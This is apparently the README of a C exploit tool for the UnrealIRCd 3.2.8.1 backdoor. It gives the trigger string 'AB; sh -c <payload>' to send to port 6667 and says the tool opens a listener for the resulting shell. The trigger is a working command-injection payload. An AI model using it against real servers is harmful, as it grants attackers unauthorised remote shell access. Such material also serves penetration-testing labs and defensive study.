# ircd_backdoor

![](https://img.shields.io/badge/made%20with-C-blue)

### Description
This program exploits the famous UnrealIRCD 3.2.8.1 backdoor.
In order to trigger the backdoor, you have to connect to the 
exposed IRCD port (usually 6667), and send the following string:

```bash 
AB; sh -c <payload> \n
```

This program already starts listening on the lport specified, but
if you wanted to exploit it manually, you have to start your own listener.
